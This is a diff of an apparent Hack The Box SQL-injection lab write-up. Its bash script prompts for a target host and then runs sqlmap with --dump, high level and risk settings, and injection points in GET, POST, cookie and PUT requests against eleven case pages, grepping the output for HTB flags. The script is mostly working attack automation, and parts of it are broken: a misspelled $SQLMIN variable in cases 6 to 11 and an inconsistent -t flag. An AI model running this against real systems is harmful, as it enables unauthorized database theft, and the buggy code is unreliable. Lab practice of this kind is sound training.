@@ -64,26 +64,20 @@
 #####Master output (bash) shell script:
 	#!/bin/bash
 
-	### Variables
-	TGTHOST=''
-	UINHOST=''
-	UINPROTO=''
-	OUTLOG=''
-	OUTFILE=''
-	SQMIN=''
-
 	#shorthand
-	OUTLOG='/home/'$USER'/.local/share/sqlmapout/'
-	OUTFILE=$(date +%s)'.txt'
-	SQMIN='sqlmap --batch --dump -D testdb --dbms=MySQL --random-agent -u '$TGTHOST
+	OUTLOG='/home/'$USER'/Documents/'$(date +%s)'.txt'
+	touch $OUTLOG
+	echo -e "output log file with location " $OUTLOG
+	#exludes info of status updates for cracking
+#	OUTFILE=" | grep -v -E '(^\[[0-9]{2}:[0-9]{2}:[0-9]{2}\] \[INFO\] current status: .*$)' >> $OUTLOG"
 
 	# Get target info from user
-	echo -n "Enter Target host, with port ':', without protocol: "
+	echo -e "Enter Target host, with port :, without protocol: "
 	read UINHOST
-	echo -n "Enter Protocol (http or https) "
+	echo -e "Enter Protocol (http or https) "
 	read UINPROTO
 	TGTHOST="$UINPROTO://$UINHOST"
-	TGTHOST="'$TGTHOST'"
+	TGTHOST="$TGTHOST"
 	echo -e "Target host set to" $TGTHOST
 
 	# check if sqlmap is installed
@@ -95,63 +89,60 @@
 	fi
 
 	# check if paths exists
-	if [ -d "$OUTLOG" ];
-	then
-	  (echo 'path: '$OUTLOG' exists');
-	  else (mkdir $OUTLOG && echo -e "making directory: " $OUTLOG);
-	fi
+#	if [ -d "$OUTLOG" ];
+#	then
+#	  (echo 'path: '$OUTLOG' exists');
+#	  else (touch $OUTLOG && echo -e "making directory: " $OUTLOG);
+#	fi
+
+	SQMIN='sqlmap --batch --dump -D testdb --dbms=MySQL --random-agent -u '$TGTHOST
+	echo -e "SQMIN = " $SQMIN
 
 	#main commands
-	CS1=$SQMIN''$TGTHOST'/case1.php?id=1*' -T flag1
+	CS1="$SQMIN/case1.php?id=1* -t flag1"
 	echo -e 'running case 1: ' $CS1
-	$CS1 >&1 > $OUTLOG$OUTFILE
-	cat $OUTLOG$OUTFILE | grep -i -E '(flag\d{1,2}\.csv)'
-	
-	$CS2=$SQMIN''$TGTHOST'/case2.php' --compressed -X POST -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Referer: http://$TGTHOST/case2.php' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://$TGTHOST' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-GPC: 1' -H 'Pragma: no-cache' -H 'Cache-Control: no-cache' --data-raw 'id=1*' -T flag2
+	$CS1 | grep -v -E '(^\[[0-9]{2}:[0-9]{2}:[0-9]{2}\] \[INFO\] current status: .*$)' >> $OUTLOG
+
+	CS2="$SQMIN/case2.php --compressed --method POST --data-raw 'id=1*' -T flag2"
 	echo -e 'running case 2: ' $CS2
-	$CS2 >&1 > $OUTLOG$OUTFILE
-	cat $OUTLOG$OUTFILE | grep -i -E 'flag\d{1,2}\.csv'
+	$CS2 | grep -v -E '(^\[[0-9]{2}:[0-9]{2}:[0-9]{2}\] \[INFO\] current status: .*$)' >> $OUTLOG
 
-	CS3=$SQMIN''$TGTHOST/case3.php' -T flag3 --cookie='id=1*' --method PUT
+	CS3="$SQMIN/case3.php -T flag3 --cookie='id=1*' --method PUT"
 	echo -e 'running case 3: ' $CS3
-	$CS3 >&1 > $OUTLOG$OUTFILE
-	cat $OUTLOG$OUTFILE | grep -i -E 'flag\d{1,2}\.csv'
+	$CS3 | grep -v -E '(^\[[0-9]{2}:[0-9]{2}:[0-9]{2}\] \[INFO\] current status: .*$)' >> $OUTLOG
 
-#	CS4=$SQMIN'$TGTHOST/case4.php' -T flag4
-#	echo -e 'running case 4: ' $CS4
-#
-#	CS5=$SQMIN'$TGTHOST/case5.php?id=*' -T flag5 --no-cast --level 5 --risk 3 --technique=BEU --method=GET
-#	echo -e 'running case 5: ' $CS5
-#
-#	CS6=$SQLMIN'$TGTHOST/case6.php?col=id' -T flag6 --level 5 --risk 3 --method=GET -v 3 --prefix="\`)"
-#	echo -e 'running case 6: ' $CS6
-#
-#	CS7=
-#	echo -e 'running case 7: ' $CS7
-#
-#	CS8=
-#	echo -e 'running case 8: ' $CS8
-#
-#	CS9=
-#	echo -e 'running case 9: ' $CS9
-#
-#	CS10=
-#	echo -e 'running case 10: ' $CS10
-#
-#	CS11=
-#	echo -e 'running case 11: ' $CS11
-#
-	echo -e 'outputting all logs to: ' $OUTLOG$OUTFILE
-	echo -e 'all flags: ' 
-	echo -e 'flag1: '
-	echo -e 'flag2: '
-	echo -e 'flag3: '
-	echo -e 'flag4: '
-	echo -e 'flag5: '
-	echo -e 'flag6: '
-	echo -e 'flag7: '
-	echo -e 'flag8: '
-	echo -e 'flag9: '
-	echo -e 'flag10: '
-	echo -e 'flag11: '
+	CS4="$SQMIN/case4.php -T flag4"
+	echo -e 'running case 4: ' $CS4
+	$CS4 | grep -v -E '(^\[[0-9]{2}:[0-9]{2}:[0-9]{2}\] \[INFO\] current status: .*$)' >> $OUTLOG
 
+	CS5="$SQMIN/case5.php?id=* -T flag5 --no-cast --level 5 --risk 3 --technique=BEU --method=GET"
+	echo -e 'running case 5: ' $CS5
+	$CS5 | grep -v -E '(^\[[0-9]{2}:[0-9]{2}:[0-9]{2}\] \[INFO\] current status: .*$)' >> $OUTLOG
+
+	CS6="$SQLMIN/case6.php?col=id -T flag6 --level 5 --risk 3 --method=GET -v 3 --prefix='\`)'"
+	echo -e 'running case 6: ' $CS6
+	$CS6 | grep -v -E '(^\[[0-9]{2}:[0-9]{2}:[0-9]{2}\] \[INFO\] current status: .*$)' >> $OUTLOG
+
+	CS7="$SQLMIN/case7.php -T flag7"
+	echo -e 'running case 7: ' $CS7
+	$CS7 | grep -v -E '(^\[[0-9]{2}:[0-9]{2}:[0-9]{2}\] \[INFO\] current status: .*$)' >> $OUTLOG
+
+	CS8="$SQLMIN/case8.php -T flag8"
+	echo -e 'running case 8: ' $CS8
+	$CS8 | grep -v -E '(^\[[0-9]{2}:[0-9]{2}:[0-9]{2}\] \[INFO\] current status: .*$)' >> $OUTLOG
+
+	CS9="$SQLMIN/case9.php -T flag9"
+	echo -e 'running case 9: ' $CS9
+	$CS9 | grep -v -E '(^\[[0-9]{2}:[0-9]{2}:[0-9]{2}\] \[INFO\] current status: .*$)' >> $OUTLOG
+
+	CS10="$SQLMIN/case10.php -T flag10"
+	echo -e 'running case 10: ' $CS10
+	$CS10 | grep -v -E '(^\[[0-9]{2}:[0-9]{2}:[0-9]{2}\] \[INFO\] current status: .*$)' >> $OUTLOG
+
+	CS11="$SQLMIN/case11.php -T flag11"
+	echo -e 'running case 11: ' $CS11
+	$CS11 | grep -v -E '(^\[[0-9]{2}:[0-9]{2}:[0-9]{2}\] \[INFO\] current status: .*$)' >> $OUTLOG
+
+	echo -e 'outputting all logs to: ' $OUTLOG
+	echo -e 'all flags: '
+	cat $OUTLOG | grep -i -E '(HTB\{.+\})'
